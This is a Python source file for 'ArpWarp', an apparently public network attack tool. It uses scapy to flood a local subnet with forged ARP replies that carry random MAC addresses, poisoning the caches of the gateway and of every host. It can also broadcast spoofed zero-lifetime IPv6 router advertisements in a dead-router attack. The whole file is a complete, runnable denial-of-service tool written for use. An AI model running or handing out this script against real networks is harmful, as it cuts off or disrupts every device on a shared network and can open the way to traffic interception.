#!/usr/bin/env python3

import ipaddress
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # suppress warnings

from scapy.all import *
from utils import *
conf.verb = 0
#   --------------------------------------------------------------------------------------------------------------------
#   ....................................................................................................................
#   ......................................._.........______........__.........____......................................
#   ....................................../ \...____|    \ \....../ /___.____|    \.....................................
#   ...................................../   \.|  __|     \ \ /\ / /    |  __|     |....................................
#   ..................................../ /.\ \| |  |  __/.\      /     | |..|  __/.....................................
#   .................................../_/...\_\_|..|_|.....\_/\_/.\____|_|..|_|........................................
#   ....................................................................................................................
#   Ⓒ by https://github.com/flashnuke Ⓒ................................................................................
#   --------------------------------------------------------------------------------------------------------------------


class ArpWarp:
    def __init__(self, iface, cidrlen, s_time, gateway, spoof_ipv6ra, ipv6_preflen):
        self.network_interface = iface
        self.arp_poison_interval = s_time
        self.ipv6_preflen = ipv6_preflen or IPV6_PREFLEN

        conf.iface = self.network_interface
        self.cidrlen_ipv4 = cidrlen

        self.spoof_ipv6ra = spoof_ipv6ra

        self.user_ipv4 = get_if_addr(self.network_interface)

        self.subnet_ipv4 = self.user_ipv4.split(".")[:3]
        self.subnet_ipv4_sr = f"{'.'.join(self.subnet_ipv4)}.0/{self.cidrlen_ipv4}"

        self.gateway_ipv4 = gateway or self.get_gateway_ipv4(self.network_interface)
        self.gateway_mac = getmacbyip(self.gateway_ipv4)
        if not self.gateway_mac:
            raise Exception(f"[!] Unable to get gateway mac -> {self.gateway_ipv4}")
        self.gateway_ipv6 = mac2ipv6_ll(self.gateway_mac, IPV6_LL_PREF)

        self.print_settings()

        self.host_ipv4s = [str(host_ip) for host_ip in ipaddress.IPv4Network(self.subnet_ipv4_sr) if
                           str(host_ip) != self.user_ipv4 and str(host_ip) != self.gateway_ipv4]
        printf(f"[*] Generated {len(self.host_ipv4s)} possible IPV4 hosts")
        if self.spoof_ipv6ra:
            printf(f"[*] IPv6 RA spoof is enabled, setting up...")
            if not os_is_windows():
                printf("[*] Pinging IPv6 subnet for hosts...")
                printf(f"[+] Found {len(self.get_all_hosts_ipv6())} IPv6 hosts during setup")
            else:
                printf("[-] Windows does not support ping6, skipping...")
        else:
            printf(f"[-] IPv6 RA spoof is disabled, skipping ping6...")

        self.abort = False

    def print_settings(self):
        printf("- net iface" + self.network_interface.rjust(38))
        printf("- sleep time" + str(self.arp_poison_interval).rjust(32) + "[sec]")
        printf("- IPv4 subnet" + self.subnet_ipv4_sr.rjust(36))
        printf("- IPv4 gateway" + self.gateway_ipv4.rjust(35))
        printf("- IPv6 gateway" + self.gateway_ipv6.rjust(35))
        printf("- IPv6 preflen" + str(self.ipv6_preflen).rjust(35))
        printf("- spoof IPv6 RA" + str(self.spoof_ipv6ra).rjust(34))
        printf(DELIM)

    def get_all_hosts_ipv6(self) -> List[str]:
        ipv6_hosts = list()
        try:
            ping_output = subprocess.check_output(['ping6', '-I', self.network_interface,
                                                   IPV6_MULTIC_ADDR, "-c", "3"], stderr=subprocess.DEVNULL).decode()
            for line in ping_output.splitlines():
                s_idx = line.find(IPV6_LL_PREF)
                e_idx = line.find(f"%{self.network_interface}")
                if s_idx > 0 and e_idx > 0:
                    host = line[s_idx:e_idx]
                    if host not in ipv6_hosts:
                        ipv6_hosts.append(host)  # returns None on fail
        except Exception:
            pass
        return ipv6_hosts

    def poison_arp(self):
        """
        * poison the gateway arp cache with a spoofed mac address for every possible host
        * poison every possible host with a spoofed mac address for the gateway
        """
        for host_ip in self.host_ipv4s:
            arp_packet_gateway = ARP(op=2, psrc=host_ip, hwdst=self.gateway_mac, hwsrc=RandMAC(),
                                     pdst=self.gateway_ipv4)
            sendp(Ether() / arp_packet_gateway, iface=self.network_interface)

            # poison host's arp cache
            arp_packet_host = ARP(op=2, psrc=self.gateway_ipv4, hwsrc=RandMAC(), pdst=host_ip)
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / arp_packet_host, iface=self.network_interface)

    def poison_ra(self):
        """
        * Broadcast a fake dead router message periodically
        """
        rand_mac = RandMAC()
        spoofed_mc_ra = Ether(src=rand_mac) / \
                        IPv6(src=self.gateway_ipv6, dst=IPV6_MULTIC_ADDR) / \
                        ICMPv6ND_RA(chlim=255, routerlifetime=0, reachabletime=0) / \
                        ICMPv6NDOptSrcLLAddr(lladdr=rand_mac) / \
                        ICMPv6NDOptMTU() / \
                        ICMPv6NDOptPrefixInfo(prefixlen=self.ipv6_preflen, prefix=f"{IPV6_LL_PREF}::")
        sendp(spoofed_mc_ra)
    
    def dead_router_attack(self):
        """
        * Monitor RA messages and immediately send fake zero-lifetime RA packets
        """
        NDP_Attack_Kill_Default_Router(iface=self.network_interface)

    def start_attack(self):
        loop_count = 0
        printf(DELIM)
        if os_is_linux():
            printf("")
            printf("")
        if self.spoof_ipv6ra:
            threading.Thread(target=self.dead_router_attack, daemon=True).start()
        while not self.abort:
            try:
                loop_count += 1
                now = get_ts_ms()
                self.poison_arp()
                if self.spoof_ipv6ra:
                    self.poison_ra()
                if os_is_linux():
                    printf(2 * "\x1b[1A\x1b[2K")
                printf(f"[+] attacking..." + f"cycle #{str(loop_count)} duration {get_ts_ms() - now}[ms]".rjust(33))
                time.sleep(self.arp_poison_interval)
            except Exception as exc:
                printf(DELIM)
                printf(f"[!] Exception caught -> {exc}")
                printf(traceback.format_exc())
                self.abort = True
            except KeyboardInterrupt:
                printf(DELIM)
                printf(f"[-] User requested to stop...")
                self.abort = True

    @staticmethod
    def get_gateway_ipv4(iface):
        try:
            return [r[2] for r in conf.route.routes if r[3] == iface and r[2] != '0.0.0.0'][0]
        except Exception:
            raise Exception(f"[!] Unable to IPv4 gateway, try setting manually by passing (-g, --set-gateway)...")


if __name__ == "__main__":
    print(f"\n{BANNER}\nWritten by @flashnuke")
    print(DELIM)

    arguments = define_args()
    invalidate_print()  # after arg parsing

    warper = ArpWarp(arguments.iface, arguments.cidrlen, arguments.s_time, arguments.gateway,
                     arguments.spoof_ipv6ra, arguments.preflen)
    warper.start_attack()
